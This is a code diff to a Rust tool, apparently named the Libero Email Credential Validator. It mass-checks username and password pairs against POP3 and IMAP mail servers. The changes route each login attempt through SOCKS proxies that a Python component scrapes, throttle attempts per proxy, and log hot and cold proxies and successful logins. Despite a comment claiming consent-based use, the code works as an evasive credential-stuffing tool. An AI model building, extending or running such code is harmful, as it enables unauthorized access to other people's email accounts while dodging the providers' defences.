@@ -24,14 +24,18 @@ use libero_validator::estimate_bloom_size;
 use memmap2::Mmap;
 use once_cell::sync::Lazy;
 use parking_lot::Mutex;
-use rand::seq::SliceRandom;
+use dashmap::DashMap;
+use pyo3::prelude::*;
+use pyo3_asyncio::tokio as pyo3_tokio;
+use tokio_socks::tcp::{Socks4Stream, Socks5Stream};
+use url::Url;
 use rand::{rng, Rng};
 use socket2::{Domain, Protocol, Socket, Type};
 use std::fs::{File, OpenOptions};
 use std::io::{BufWriter, Write};
 use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
 use std::process::Command;
-use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
+use std::sync::atomic::{AtomicUsize, AtomicI64, AtomicU32, Ordering};
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 use tokio::net::TcpStream;
@@ -39,7 +43,7 @@ use tokio::sync::mpsc::{self, Receiver};
 use tokio::sync::Mutex as AsyncMutex;
 use tokio::task::JoinHandle;
 use tokio::time::interval;
-use tracing_subscriber::fmt;
+use env_logger;
 
 // ---------------------------------------------------------------------------
 // ENH#23 – Switch global allocator to jemalloc (zero‑fragmentation at scale)
@@ -208,169 +212,247 @@ fn _tune_socket(sock: &std::net::TcpStream) {
 }
 
 // ---------------------------------------------------------------------------
-// ProxyPool with latency pre‑filter (ENH#19) & persistent tunnels (ENH#14)
-#[derive(Clone)]
+// ProxyPool backed by DashMap with latency pre-filter and rate limiting
+
+struct ProxyMeta {
+    last_used: AtomicI64,
+    errors: AtomicU32,
+    is_cold: bool,
+}
+
 struct ProxyPool {
-    cycle: Arc<Mutex<Vec<String>>>,
-    idx: Arc<AtomicUsize>,
-    ready: Arc<AtomicBool>,
+    map: Arc<DashMap<String, Arc<ProxyMeta>>>,
+    keys: Arc<Mutex<Vec<String>>>,
+    idx: AtomicUsize,
+}
+
+impl Clone for ProxyPool {
+    fn clone(&self) -> Self {
+        Self {
+            map: self.map.clone(),
+            keys: self.keys.clone(),
+            idx: AtomicUsize::new(self.idx.load(Ordering::Relaxed)),
+        }
+    }
 }
 
 impl ProxyPool {
-    fn new(mut proxies: Vec<String>) -> Self {
-        proxies.shuffle(&mut rng());
-        let pool = Self {
-            cycle: Arc::new(Mutex::new(proxies)),
-            idx: Arc::new(AtomicUsize::new(0)),
-            ready: Arc::new(AtomicBool::new(false)),
-        };
-        // Kick off latency filter in background
-        let pool_clone = pool.clone();
-        tokio::spawn(async move {
-            pool_clone.filter_latency().await;
-        });
-        pool
+    fn new(initial: Vec<(String, bool)>) -> Self {
+        let map = DashMap::new();
+        let mut keys = Vec::new();
+        for (p, cold) in initial {
+            map.entry(p.clone()).or_insert(Arc::new(ProxyMeta {
+                last_used: AtomicI64::new(0),
+                errors: AtomicU32::new(0),
+                is_cold: cold,
+            }));
+            keys.push(p);
+        }
+        Self {
+            map: Arc::new(map),
+            keys: Arc::new(Mutex::new(keys)),
+            idx: AtomicUsize::new(0),
+        }
     }
 
-    async fn filter_latency(&self) {
-        let mut good = Vec::new();
-        {
-            let all = self.cycle.lock().clone();
-            // Probe in parallel (timeout 250 ms)
-            let futs = all.into_iter().map(|p| async move {
-                let start = Instant::now();
-                if let Some(addr) = extract_addr(&p) {
-                    let _ =
-                        tokio::time::timeout(Duration::from_millis(250), TcpStream::connect(&addr))
-                            .await;
+    fn insert(&self, proxy: String, cold: bool) {
+        if self.map.contains_key(&proxy) {
+            return;
+        }
+        self.map.insert(
+            proxy.clone(),
+            Arc::new(ProxyMeta {
+                last_used: AtomicI64::new(0),
+                errors: AtomicU32::new(0),
+                is_cold: cold,
+            }),
+        );
+        self.keys.lock().push(proxy);
+    }
+
+    fn count_hot(&self) -> usize {
+        self.map
+            .iter()
+            .filter(|m| !m.value().is_cold)
+            .count()
+    }
+
+    fn count_cold(&self) -> usize {
+        self.map
+            .iter()
+            .filter(|m| m.value().is_cold)
+            .count()
+    }
+
+    async fn acquire(&self, ppm: u32) -> Option<String> {
+        let keys_len = self.keys.lock().len();
+        if keys_len == 0 {
+            return None;
+        }
+        for _ in 0..keys_len {
+            let idx = self.idx.fetch_add(1, Ordering::Relaxed);
+            let key = {
+                let lock = self.keys.lock();
+                if lock.is_empty() {
+                    return None;
                 }
-                (p, start.elapsed())
-            });
-            for (p, dur) in futures::future::join_all(futs).await {
-                if dur < Duration::from_millis(250) {
-                    good.push(p);
+                lock[idx % lock.len()].clone()
+            };
+            if let Some(meta) = self.map.get(&key) {
+                if meta.is_cold {
+                    continue;
                 }
+                let now = chrono::Utc::now().timestamp_millis();
+                let interval = 60_000_i64 / (ppm.max(1) as i64);
+                let last = meta.last_used.load(Ordering::Relaxed);
+                if now - last < interval {
+                    log::debug!("rate-limit skip {key}");
+                    continue;
+                }
+                meta.last_used.store(now, Ordering::Relaxed);
+                return Some(key);
             }
         }
-        if !good.is_empty() {
-            *self.cycle.lock() = good;
-        }
-        self.ready.store(true, Ordering::Release);
+        None
     }
 
-    #[inline]
-    fn next(&self) -> String {
-        // Spin until latency filter done for the first fetch to reduce net‑errors
-        while !self.ready.load(Ordering::Acquire) {
-            std::hint::spin_loop();
+    fn record_error(&self, proxy: &str) {
+        if let Some(meta) = self.map.get(proxy) {
+            meta.errors.fetch_add(1, Ordering::Relaxed);
         }
-        let idx = self.idx.fetch_add(1, Ordering::Relaxed);
-        let lock = self.cycle.lock();
-        let len = lock.len();
-        if len == 0 {
-            return String::new();
-        }
-        lock[idx % len].clone()
     }
 
     fn size(&self) -> usize {
-        self.cycle.lock().len()
-    }
-
-    fn replace(&self, mut proxies: Vec<String>) {
-        proxies.shuffle(&mut rng());
-        *self.cycle.lock() = proxies;
-        self.ready.store(false, Ordering::Release);
-        let pool_clone = self.clone();
-        tokio::spawn(async move {
-            pool_clone.filter_latency().await;
-        });
+        self.map.len()
     }
 }
 
 fn extract_addr(proxy: &str) -> Option<String> {
-    let p = proxy.splitn(2, "://").nth(1).unwrap_or(proxy);
-    let without_user = p.rsplitn(2, '@').next().unwrap_or(p);
-    if without_user.contains(':') {
-        Some(without_user.to_string())
-    } else {
-        None
+    let url = Url::parse(proxy).ok()?;
+    Some(format!("{}:{}", url.host_str()?, url.port()?))
+}
+
+fn parse_proxy_line(line: &str) -> Option<(String, bool)> {
+    let line = line.trim();
+    if line.is_empty() || line.starts_with('#') {
+        return None;
+    }
+    let url = Url::parse(line).or_else(|_| Url::parse(&format!("socks4://{}", line))).ok()?;
+    match url.scheme() {
+        "socks4" | "socks4a" | "socks5" | "socks5h" => Some((url.to_string(), false)),
+        "http" | "https" => Some((url.to_string(), true)),
+        _ => None,
     }
 }
 
 fn parse_proxies(data: &str) -> Vec<String> {
-    static RE: Lazy<regex::Regex> = Lazy::new(|| {
-        regex::Regex::new(
-            r"^(?:(?P<user>[^:@]+):(?P<pwd>[^:@]+)@)?(?P<host>\[[^\]]+\]|[^:]+):(?P<port>\d{1,5})$",
-        )
-        .unwrap()
-    });
-
-    let mut formatted = Vec::with_capacity(data.lines().count());
-    for ln in data.lines().map(str::trim) {
-        if ln.is_empty() || ln.starts_with('#') {
-            continue;
-        }
-
-        if let Some(cap) = RE.captures(ln) {
-            let host = cap.name("host").unwrap().as_str();
-            let port = cap.name("port").unwrap().as_str();
-            if let (Some(user), Some(pwd)) = (cap.name("user"), cap.name("pwd")) {
-                formatted.push(format!(
-                    "http://{}:{}@{}:{}",
-                    user.as_str(),
-                    pwd.as_str(),
-                    host,
-                    port
-                ));
-            } else {
-                formatted.push(format!("socks4a://{}:{}", host, port));
-            }
-        } else {
-            eprintln!("Skipping malformed proxy: {}", ln);
-        }
-    }
-    formatted
+    data
+        .lines()
+        .filter_map(|l| parse_proxy_line(l).map(|(p, _)| p))
+        .collect()
 }
 
-fn load_proxies(path: &str) -> ProxyPool {
-    let data = std::fs::read_to_string(path).expect("Proxy file not found");
-    let formatted = parse_proxies(&data);
-    if formatted.is_empty() {
-        panic!("Proxy file is empty or invalid");
-    }
-    #[cfg(target_os = "linux")]
-    prewarm_syn_pool(&formatted); // ENH#5 SYN pool warm‑up
-    ProxyPool::new(formatted)
+fn load_proxies(path: &str) -> Vec<(String, bool)> {
+    let data = std::fs::read_to_string(path).unwrap_or_default();
+    data.lines().filter_map(parse_proxy_line).collect()
 }
 
-async fn watch_proxies(path: String, pool: ProxyPool, interval: u64) {
-    use std::time::SystemTime;
-    use tokio::fs;
-    use tokio::time::sleep;
+async fn latency_ok(proxy: &str) -> bool {
+    if let Some(addr) = extract_addr(proxy) {
+        tokio::time::timeout(Duration::from_millis(250), TcpStream::connect(&addr))
+            .await
+            .is_ok()
+    } else {
+        false
+    }
+}
 
-    let mut last: Option<SystemTime> = None;
-    loop {
-        sleep(Duration::from_secs(interval)).await;
-        if let Ok(meta) = fs::metadata(&path).await {
-            if let Ok(modified) = meta.modified() {
-                if Some(modified) != last {
-                    if let Ok(data) = fs::read_to_string(&path).await {
-                        let proxies = parse_proxies(&data);
-                        if !proxies.is_empty() {
-                            pool.replace(proxies);
-                            last = Some(modified);
-                        }
-                    }
-                }
-            }
+fn spawn_scraper(tx: mpsc::UnboundedSender<String>) -> JoinHandle<()> {
+    tokio::spawn(async move {
+        pyo3::prepare_freethreaded_python();
+        let fut = Python::with_gil(|py| -> PyResult<_> {
+            let sender = Py::new(py, PySender { tx })?;
+            let module = py.import("proxy_gatherer.bridge")?;
+            let coro = module.getattr("run")?.call1((sender,))?;
+            pyo3_tokio::into_future(coro)
+        })
+        .expect("py init");
+        if let Err(e) = fut.await {
+            eprintln!("python task error: {e:?}");
         }
+    })
+}
+
+#[pyclass]
+struct PySender {
+    tx: mpsc::UnboundedSender<String>,
+}
+
+#[pymethods]
+impl PySender {
+    fn send<'p>(&self, py: Python<'p>, proxy: String) -> PyResult<&'p PyAny> {
+        let tx = self.tx.clone();
+        pyo3_tokio::future_into_py(py, async move {
+            let _ = tx.send(proxy);
+            Ok(())
+        })
     }
 }
 
 
 
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
+
+enum MailProto {
+    PopSsl,
+    Pop,
+    ImapSsl,
+    Imap,
+}
+
+impl MailProto {
+    fn port(&self) -> u16 {
+        match self {
+            MailProto::PopSsl => 995,
+            MailProto::Pop => 110,
+            MailProto::ImapSsl => 993,
+            MailProto::Imap => 143,
+        }
+    }
+}
+
+async fn dial(target_host: &str, proto: MailProto, proxy: &str, timeout: Duration) -> std::io::Result<TcpStream> {
+    let url = Url::parse(proxy).map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidInput, "bad proxy"))?;
+    let addr = format!("{}:{}", url.host_str().ok_or(std::io::ErrorKind::InvalidInput)?, url.port_or_known_default().ok_or(std::io::ErrorKind::InvalidInput)?);
+    let target = (target_host, proto.port());
+    match url.scheme() {
+        "socks4" | "socks4a" => {
+            match tokio::time::timeout(timeout, Socks4Stream::connect(addr.as_str(), target)).await {
+                Ok(Ok(s)) => Ok(s.into_inner()),
+                Ok(Err(e)) => Err(std::io::Error::new(std::io::ErrorKind::Other, e)),
+                Err(e) => Err(std::io::Error::new(std::io::ErrorKind::TimedOut, e)),
+            }
+        }
+        "socks5" | "socks5h" => {
+            if !url.username().is_empty() || url.password().is_some() {
+                let user = url.username();
+                let pass = url.password().unwrap_or("");
+                match tokio::time::timeout(timeout, Socks5Stream::connect_with_password(addr.as_str(), target, user, pass)).await {
+                    Ok(Ok(s)) => Ok(s.into_inner()),
+                    Ok(Err(e)) => Err(std::io::Error::new(std::io::ErrorKind::Other, e)),
+                    Err(e) => Err(std::io::Error::new(std::io::ErrorKind::TimedOut, e)),
+                }
+            } else {
+                match tokio::time::timeout(timeout, Socks5Stream::connect(addr.as_str(), target)).await {
+                    Ok(Ok(s)) => Ok(s.into_inner()),
+                    Ok(Err(e)) => Err(std::io::Error::new(std::io::ErrorKind::Other, e)),
+                    Err(e) => Err(std::io::Error::new(std::io::ErrorKind::TimedOut, e)),
+                }
+            }
+        }
+        _ => Err(std::io::Error::new(std::io::ErrorKind::Unsupported, "scheme")),
+    }
+}
 
 #[allow(dead_code)]
 struct POP3Handler {
@@ -397,40 +479,19 @@ impl POP3Handler {
         let addr = format!("{}:{}", self.host, self.port);
         let request = format!("USER {}\r\nPASS {}\r\nQUIT\r\n", user, pwd);
 
-        #[cfg(all(feature = "fast-open", target_os = "linux"))]
-        if _fast_open {
-            use socket2::{Domain, Protocol, SockRef, Socket, Type};
-            use std::net::ToSocketAddrs;
-            if let Ok(mut addrs) = addr.to_socket_addrs() {
-                if let Some(sa) = addrs.next() {
-                    if let Ok(sock) =
-                        Socket::new(Domain::for_address(sa), Type::STREAM, Some(Protocol::TCP))
-                    {
-                        set_socket_opts(&sock);
-                        let _ = SockRef::from(&sock).set_tcp_fastopen_connect(true);
-                        sock.set_nonblocking(true).ok();
-                        let _ = sock.connect(&sa.into());
-                        let std_stream: std::net::TcpStream = sock.into();
-                        std_stream.set_nonblocking(true).ok();
-                        if let Ok(mut stream) = TcpStream::from_std(std_stream) {
-                            if stream.write_all(request.as_bytes()).await.is_err() {
-                                return false;
-                            }
-                            let mut buf = [0u8; 4];
-                            if stream.read_exact(&mut buf).await.is_err() {
-                                return false;
-                            }
-                            return &buf[..3] == b"+OK";
-                        }
-                    }
-                }
+        let mut stream = match dial(
+            &self.host,
+            if self._ssl_flag { MailProto::PopSsl } else { MailProto::Pop },
+            &self._proxy_uri,
+            self.timeout,
+        )
+        .await
+        {
+            Ok(s) => s,
+            Err(e) => {
+                log::warn!("dial failure: {e}");
+                return false;
             }
-        }
-
-        let conn = tokio::time::timeout(self.timeout, TcpStream::connect(&addr)).await;
-        let mut stream = match conn {
-            Ok(Ok(s)) => s,
-            _ => return false,
         };
         if tokio::time::timeout(self.timeout, stream.write_all(request.as_bytes()))
             .await
@@ -659,11 +720,10 @@ fn create_consumer(
 
             for retry in 0..=cfg.max_retries {
                 {
-                    let proxy = proxies.next();
-                    if proxy.is_empty() {
+                    let Some(proxy) = proxies.acquire(cfg.ppm).await else {
                         net_err = true;
                         break;
-                    }
+                    };
                     for item in &matrix {
                         match item {
                             MatrixItem::Pop {
@@ -772,6 +832,7 @@ struct Config {
     refresh: f64,
     shards: usize,
     fast_open: bool,
+    ppm: u32,
     _nic_queue_pin: bool,
 }
 
@@ -857,6 +918,9 @@ struct Cli {
     /// Enable TCP Fast Open
     #[arg(long)]
     fast_open: bool,
+    /// Proxy attempts per minute
+    #[arg(long = "ppm")] 
+    ppm: Option<u32>,
     /// Shards (fork processes)
     //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
     //Key legitimate use cases include:
@@ -887,6 +951,7 @@ fn merge_cfg(cli: Cli) -> Config {
         refresh: 0.016,
         shards: cli.shards,
         fast_open: cli.fast_open,
+        ppm: cli.ppm.unwrap_or(5),
         _nic_queue_pin: false,
     };
     if let Some(c) = cli.conc {
@@ -918,19 +983,40 @@ fn merge_cfg(cli: Cli) -> Config {
 //LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
 //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
 async fn run_validator(cfg: Arc<Config>) {
-    let proxies = {
-        let p = load_proxies(&cfg.proxy_file);
-        println!("Loaded {} proxies", p.size());
-        let watch_pool = p.clone();
-        let path = cfg.proxy_file.clone();
-        let watch_interval = cfg.watch_interval;
-        tokio::spawn(async move {
-            watch_proxies(path, watch_pool, watch_interval).await;
-        });
-        p
-    };
-
+    let initial = load_proxies(&cfg.proxy_file);
+    let proxies = ProxyPool::new(initial);
+    println!("Loaded {} proxies", proxies.size());
+    let (p_tx, mut p_rx) = mpsc::unbounded_channel();
+    spawn_scraper(p_tx);
+    let pool_clone = proxies.clone();
+    tokio::spawn(async move {
+        while let Some(line) = p_rx.recv().await {
+            if let Some((url, cold)) = parse_proxy_line(&line) {
+                if latency_ok(&url).await {
+                    pool_clone.insert(url, cold);
+                }
+            }
+        }
+    });
     let stats = Arc::new(Stats::new());
+    let stats_clone = stats.clone();
+    let proxies_clone = proxies.clone();
+    let start_time = Instant::now();
+    tokio::spawn(async move {
+        let mut int = interval(Duration::from_secs(30));
+        loop {
+            int.tick().await;
+            let attempts_per_min = stats_clone.checked.load(Ordering::Relaxed) as f64 / (start_time.elapsed().as_secs_f64() / 60.0).max(1.0);
+            log::info!(
+                "hot:{} cold:{} attempts/min:{:.0} successes:{} errors:{}",
+                proxies_clone.count_hot(),
+                proxies_clone.count_cold(),
+                attempts_per_min,
+                stats_clone.valid.load(Ordering::Relaxed),
+                stats_clone.errors.load(Ordering::Relaxed)
+            );
+        }
+    });
 
     // ENH#10 4× concurrency channel depth
     let (tx, rx) = mpsc::channel::<(String, String)>(cfg.concurrency * 4);
@@ -1021,7 +1107,7 @@ async fn run_validator(cfg: Arc<Config>) {
 // ---------------------------------------------------------------------------
 #[tokio::main]
 async fn main() {
-    fmt::init();
+    env_logger::init();
     set_nofile_limit();
     enable_tcp_tw_reuse(); // ENH#1 global sysctl tweak
     ebpf_filter::attach(); // ENH#22 optional eBPF
